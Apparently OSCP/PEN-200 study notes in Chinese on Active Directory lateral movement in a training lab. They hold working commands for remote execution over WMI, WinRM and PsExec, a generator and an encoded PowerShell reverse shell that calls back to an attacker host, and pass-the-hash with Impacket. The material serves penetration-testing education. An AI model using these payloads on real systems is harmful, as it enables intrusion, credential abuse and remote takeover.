---
title: '[OSCP, PEN-200] Instructional notes - Part 7'
disqus: hackmd
---

[OSCP, PEN-200] Instructional notes - Part 7
===

# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 1"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/README.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 2"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%202.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 3"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%203.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 4"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%204.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 5"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%205.md)
# [Link back to: "[OSCP, PEN-200] Instructional notes - Part 6"](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md)

>[!Caution]
> 接續 [[OSCP, PEN-200] Instructional notes - Part 6](https://github.com/Chw41/OffSec-Certification/blob/main/%5BOSCP%2C%20PEN-200%5D%20Offensive%20Security%20Certified%20Professional%20/Instructional%20notes/%5BOSCP%2C%20PEN-200%5D%20Instructional%20notes%20-%20Part%206.md) 內容

# Lateral Movement in Active Directory
前章節收集了密碼 Hash 值，並利用現有 ticket 進行 Kerberos 驗證。
再來將使用 Lateral Movement 技術來攻擊 high-value domain users 的機器。
>[!Tip]
>1. Kerberos 與 NTLM 認證機制並不直接使用明文密碼，因此單純破解可能並不適用。
>2. Microsoft 的 native tools 也不支援利用密碼雜湊直接進行認證

## Active Directory Lateral Movement Techniques
有關 Active Directory Domain 的技巧在 Lateral Movement 階段仍然有用，可能因此獲得先前未被發現的網路的存取權
### WMI and WinRM
WMI（Windows Management Instrumentation） 和 WinRM（Windows Remote Management） 作為 Active Directory Lateral Movement 技術的工具
>[!Note]
>**[Windows Management Instrumentation](https://learn.microsoft.com/en-us/windows/win32/wmisdk/wmi-start-page) (WMI):**\
>Windows 內建的一種 object-oriented 管理架構，可以用來管理系統資源、查詢資訊，以及遠端執行命令。它透過 RPC（[Remote Procedure Calls](https://learn.microsoft.com/en-us/windows/win32/rpc/rpc-start-page)）進行通訊，使用 TCP 135 連接遠端系統，並使用 高範圍連接埠（19152-65535） 來傳輸資料。\
WMI 允許透過 Win32_Process 類別 來建立新的 process，這使得 attacker 可以利用它來在目標系統上執行任意指令。

#### WMI 橫向移動攻擊
使用 wmic（Windows Management Instrumentation Command-line tool） 來在遠端目標機器上建立新的 process。雖然 wmic 已被微軟棄用，但仍可用於老舊環境。此外，攻擊者也可以改用 PowerShell 來達成相同效果。

將以用戶 jen 的身分執行攻擊，jen 既是 domain user，也是目標電腦的 Local Administrator group member。
#### 1. 使用 wmic 遠端執行 calc.exe
使用 Jeff RDP 登入
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jeff /d:corp.com /p:HenchmanPutridBonbon11 /v:192.168.181.75
```
透過 wmic 來在遠端機器 FILES04（192.168.144.73） 上開啟計算機（calc.exe）：
```
PS C:\Users\jeff> wmic /node:192.168.144.73 /user:jen /password:Nexus123! process call create "calc"
Executing (Win32_Process)->Create()
Method execution successful.
Out Parameters:
instance of __PARAMETERS
{
        ProcessId = 2332;
        ReturnValue = 0;
};
```
>`ProcessId = 2332;`: 表示成功建立了一個新 process\
`ReturnValue = 0;`: 表示命令成功執行

在遠端機器的 工作管理員 中，會看到 `win32calc.exe` 以使用者 jen 身份運行。\
(jen RDP: Task Manager)\
![image](https://hackmd.io/_uploads/SyySXf1hJg.png)


>[!Note]Info
>System processes and services always run in [session 0](https://techcommunity.microsoft.com/t5/ask-the-performance-team/application-compatibility-session-0-isolation/ba-p/372361) as part of session isolation, which was introduced in Windows Vista. Because the WMI Provider Host is running as a system service, the newly created processes through WMI are also spawned in session 0.
#### 2. 使用 PowerShell 透過 WMI 執行命令
(1) 建立 [PSCredential](https://docs.microsoft.com/en-us/powershell/scripting/learn/deep-dives/add-credentials-to-powershell-functions?view=powershell-7.2) Object 來儲存我們的 session username 和 password。\
PowerShell 需要將密碼轉換為 SecureString 來存儲
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
```
(2) 建立 WMI 連線:\
使用 [New-Cimsession](https://docs.microsoft.com/en-us/powershell/module/cimcmdlets/new-cimsession?view=powershell-7.2) 來與遠端機器建立 session
```
PS C:\Users\jeff> $options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $session = New-Cimsession -ComputerName 192.168.144.73 -Credential $credential -SessionOption $Options 
PS C:\Users\jeff> $command = 'calc';
```
(3) 執行遠端指令
```
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4876           0 192.168.144.73
```
>`ProcessId = 3712;` 代表成功建立新 process\
`ReturnValue = 0;` 代表指令執行成功
>> 在 FILES04 上會啟動 calc.exe，證明橫向移動成功。

(jen RDP: Task Manager)\
![image](https://hackmd.io/_uploads/ByFO7z13yx.png)

#### 3. WMI Reverse Shell
可以不只開啟 `calc.exe`，還能執行 Reverse Shell，讓遠端目標機器回連攻擊者的 Kali Linux，提供完整的控制權限。
```py
import sys
import base64

payload = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.159",8888);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'

cmd = "powershell -nop -w hidden -e " + base64.b64encode(payload.encode('utf16')[2:]).decode()

print(cmd)
```
```
┌──(chw㉿CHW)-[~/Tools]
└─$ python3 WMI_reverseshell.py 
powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABi
```
>產生 payload
##### 3.2 透過 WMI 在遠端機器執行 reverse shell
與上述 calc.exe 一樣的步驟，只是將 command 改成 base64 encode 的 reverse shell
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
PS C:\Users\jeff> $Options = New-CimSessionOption -Protocol DCOM
PS C:\Users\jeff> $Session = New-Cimsession -ComputerName 192.168.144.73 -Credential $credential -SessionOption $Options
PS C:\Users\jeff> $Command='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
PS C:\Users\jeff> $Command='powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=='
PS C:\Users\jeff> Invoke-CimMethod -CimSession $Session -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine =$Command};

ProcessId ReturnValue PSComputerName
--------- ----------- --------------
     4708           0 192.168.144.73

PS C:\Users\jeff>

```
(Kali 監聽 8888 port)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...

    
connect to [192.168.45.159] from (UNKNOWN) [192.168.144.73] 61659
PS C:\Windows\system32> hostname
FILES04
PS C:\Windows\system32> whoami
corp\jen
```

#### 使用 WinRM 進行橫向移動
除了 WMI 之外，也可以利用 WinRM（Windows Remote Management） 來達成相同的效果。\
WinRM 可用於遠端主機管理。 WinRM 是 [WS-Management](https://en.wikipedia.org/wiki/WS-Management) 協定的 Microsoft 版本 ，透過 HTTP 和 HTTPS 交換 XML 資訊。使用 TCP `5986` port 進行加密 HTTPS 流量，使用 `5985` port 進行純 HTTP 流量。
#### 1. 透過 WinRS 遠端執行命令
WinRS 是 WinRM 的 CLI 工具
```
C:\Users\jeff>winrs -r:files04 -u:jen -p:Nexus123!  "cmd /c hostname & whoami"
FILES04
corp\jen
```
#### 2. 透過 WinRS 執行 Reverse shell
將 command 改成 reverse shell payload
```
PS C:\Users\jeff> winrs -r:files04 -u:jen -p:Nexus123! "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAxADYAOAAuADQANQAuADEANQA5ACIALAA4ADgAOAA4ACkAOwAkAHMAdAByAGUAYQBtACAAPQAgACQAYwBsAGkAZQBuAHQALgBHAGUAdABTAHQAcgBlAGEAbQAoACkAOwBbAGIAeQB0AGUAWwBdAF0AJABiAHkAdABlAHMAIAA9ACAAMAAuAC4ANgA1ADUAMwA1AHwAJQB7ADAAfQA7AHcAaABpAGwAZQAoACgAJABpACAAPQAgACQAcwB0AHIAZQBhAG0ALgBSAGUAYQBkACgAJABiAHkAdABlAHMALAAgADAALAAgACQAYgB5AHQAZQBzAC4ATABlAG4AZwB0AGgAKQApACAALQBuAGUAIAAwACkAewA7ACQAZABhAHQAYQAgAD0AIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIAAtAFQAeQBwAGUATgBhAG0AZQAgAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEEAUwBDAEkASQBFAG4AYwBvAGQAaQBuAGcAKQAuAEcAZQB0AFMAdAByAGkAbgBnACgAJABiAHkAdABlAHMALAAwACwAIAAkAGkAKQA7ACQAcwBlAG4AZABiAGEAYwBrACAAPQAgACgAaQBlAHgAIAAkAGQAYQB0AGEAIAAyAD4AJgAxACAAfAAgAE8AdQB0AC0AUwB0AHIAaQBuAGcAIAApADsAJABzAGUAbgBkAGIAYQBjAGsAMgAgAD0AIAAkAHMAZQBuAGQAYgBhAGMAawAgACsAIAAiAFAAUwAgACIAIAArACAAKABwAHcAZAApAC4AUABhAHQAaAAgACsAIAAiAD4AIAAiADsAJABzAGUAbgBkAGIAeQB0AGUAIAA9ACAAKABbAHQAZQB4AHQALgBlAG4AYwBvAGQAaQBuAGcAXQA6ADoAQQBTAEMASQBJACkALgBHAGUAdABCAHkAdABlAHMAKAAkAHMAZQBuAGQAYgBhAGMAawAyACkAOwAkAHMAdAByAGUAYQBtAC4AVwByAGkAdABlACgAJABzAGUAbgBkAGIAeQB0AGUALAAwACwAJABzAGUAbgBkAGIAeQB0AGUALgBMAGUAbgBnAHQAaAApADsAJABzAHQAcgBlAGEAbQAuAEYAbAB1AHMAaAAoACkAfQA7ACQAYwBsAGkAZQBuAHQALgBDAGwAbwBzAGUAKAApAA=="
#< CLIXML
```
(Kali)
```
┌──(chw㉿CHW)-[~]
└─$ nc -nvlp 8888
listening on [any] 8888 ...
connect to [192.168.45.159] from (UNKNOWN) [192.168.144.73] 61661

PS C:\Users\jen> hostname
FILES04
PS C:\Users\jen> whoami
corp\jen
PS C:\Users\jen> 

```
#### 3. 透過 PowerShell Remoting 建立 WinRM session
```
PS C:\Users\jeff> $username = 'jen';
PS C:\Users\jeff> $password = 'Nexus123!';
PS C:\Users\jeff> $secureString = ConvertTo-SecureString $password -AsPlaintext -Force;
PS C:\Users\jeff> $credential = New-Object System.Management.Automation.PSCredential $username, $secureString;
PS C:\Users\jeff> New-PSSession -ComputerName 192.168.144.73 -Credential $credential

 Id Name            ComputerName    ComputerType    State         ConfigurationName     Availability
 -- ----            ------------    ------------    -----         -----------------     ------------
  1 WinRM1          192.168.144.73  RemoteMachine   Opened        Microsoft.PowerShell     Available

PS C:\Users\jeff> Enter-PSSession 1
[192.168.144.73]: PS C:\Users\jen\Documents> whoami
corp\jen
[192.168.144.73]: PS C:\Users\jen\Documents> hostname
FILES04
```
> 建立一個遠端會話，Session ID 為 1\
`State = Opened`：表示 session 處於開啟狀態，可以直接交互\
`Enter-PSSession 1` 直接進入遠端 PowerShell session，這樣可以直接在 192.168.144.73 上執行命令

### PsExec
PsExec 是 [SysInternals](https://docs.microsoft.com/en-us/sysinternals/) suite 中的一個強大工具。\
主要用途是提供 Remote Execution，類似於 Telnet，但不需要手動開啟遠端桌面或 SSH 連線。可以 遠端執行命令，並且提供 interactive shell。
透過 ADMIN$ share（Windows 內建的管理共享）來傳輸執行檔案。

>[!Note]
>如何透過 PsExec 進行橫向移動，需要滿足三個條件：
>1. 擁有管理員（Administrator）權限：
連線的帳戶（如 corp\jen）必須是目標機器的 Local Administrator。
>2. ADMIN$ 共享必須開啟：
ADMIN$ share 是一個內建的 Windows 網路管理共享，用於遠端管理 Windows 系統。\
(預設情況下，Windows 伺服器會啟用 ADMIN$，因此通常可用)
>3. 文件與印表機共享（File and Printer Sharing）必須開啟：
這允許 PsExec 透過 SMB 協議與目標機器通訊。\
(預設情況下，Windows 伺服器會啟用這項功能)

當執行 PsExec 遠端執行命令時，會將 `psexesvc.exe`（PsExec 服務程式）寫入遠端目標的 `C:\Windows\` 目錄。在遠端機器上建立並啟動一個 Windows 服務。讓該服務以 `psexesvc.exe` 為 parent process，執行攻擊者提供的命令。

[環境範例]\
假設我們已經成功獲取 FILES04 上 jen 的 明文密碼，並且擁有 CLIENT74 的 RDP 存取權。
此時，我們可以利用 CLIENT74 來使用 PsExec，並遠端連接 FILES04。
#### 1. 登入 RDP
```
┌──(chw㉿CHW)-[~]
└─$ xfreerdp /cert-ignore /u:jen  /p:Nexus123! /v:192.168.144.74cd \To    
```
#### 2. 使用 PsExec 遠端執行指令
SysInternals suit 已經安裝在 `C:\Tools\SysinternalsSuite`
```
PS C:\Tools> cd .\SysinternalsSuite\
PS C:\Tools\SysinternalsSuite> .\PsExec64.exe -i \\FILES04 -u corp\jen -p Nexus123! cmd

PsExec v2.4 - Execute processes remotely
Copyright (C) 2001-2022 Mark Russinovich
Sysinternals - www.sysinternals.com


Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>hostname
FILES04

C:\Windows\system32>whoami
corp\jen
```
>`-i`：使用 Interactive Mode\
`\\FILES04`：指定目標機器（遠端 Windows 伺服器）\
`-u corp\jen`：使用者帳戶（是 FILES04 的管理員）\
`-p Nexus123!`：密碼（jen 帳戶的明文密碼）\
`cmd`：執行的程式（這裡是 Windows 命令提示字元）

>[!Important]
>PsExec 比較 WMI & WinRM
>![image](https://hackmd.io/_uploads/ryWbUH1nJl.png)

### Pass the Hash
直接利用 NTLM hash 進行身份驗證並達成 Lateral Movement\
>[!Tip]
>只適用於使用 NTLM 驗證的伺服器或服務，不適用於使用 Kerberos 驗證的伺服器或服務

PtH 屬於 MITRE Framework 中的 "[Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550/)"

>[!Important]
>**PtH 工具**:
>- Metasploit 的 [PsExec](https://www.offensive-security.com/metasploit-unleashed/psexec-pass-hash/)
>- [Passing-the-hash toolkit](https://github.com/byt3bl33d3r/pth-toolkit)
>- [Impacket](https://github.com/CoreSecurity/impacket/blob/master/examples/smbclient.py)（常用於紅隊測試）
>
> 工具的基本原理類似，使用 SMB（TCP 445） 連接目標系統，然後利用 NTLM Hash 來驗證身份

>[!Note]
>Pass the Hash（PtH）需要滿足三個條件:
>1. 目標機器的 SMB（TCP 445）必須開啟（允許網路存取）。
>2. Windows 必須啟用「文件與印表機共享（File and Printer Sharing）」。
>3. 目標機器的 ADMIN$ share 必須開啟（這是 Windows 內建的管理共享，預設開啟）。
>
>與 PsExec 類似，PtH 通常需要 Local Administrator 權限，因為只有管理員帳戶能夠存取 ADMIN$。

[環境範例]\
假設已經竊取了 FILES04 伺服器的本機管理員 NTLM Hash，可以直接使用這個 Hash 來驗證，而不需要破解密碼。
#### 1. 使用 Impacket 的 wmiexec 進行 PtH
在 Kali Linux 上執行 wmiexec 來存取 FILES04
```
┌──(chw㉿CHW)-[~]
└─$ /usr/bin/impacket-wmiexec -hashes :2892D26CDF84D7A70E2EB3B9F05C425E Administrator@192.168.144.73
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>hostname
FILES04

C:\>whoami
files04\administrator
```
> `/usr/bin/impacket-wmiexec`：Impacket 工具中的 wmiexec.py（用於遠端執行命令）\
`-hashes :`：已經獲取的 NTLM Hash\
`Administrator@192.168.144.73`：目標帳戶 Administrator 在 FILES04（IP 192.168.144.73）上執行

[2014 年的 Windows 安全性更新](https://support.microsoft.com/en-us/help/2871997/microsoft-security-advisory-update-to-improve-credentials-protection-a) 限制了 本機管理員帳戶的 PtH 使用，但仍然可以用於 Active Directory domain accounts。

>[!Tip]
>**PtH + Pivoting**\
如果目標機器 FILES04 在受限網路（無法直接存取），可以：\
先滲透 CLIENT74，取得 FILES04 的 NTLM Hash\
在 CLIENT74 上執行 PtH 攻擊 FILES04，透過 Pivoting（樞紐攻擊） 進一步擴展控制權限。

### Overpass the Hash
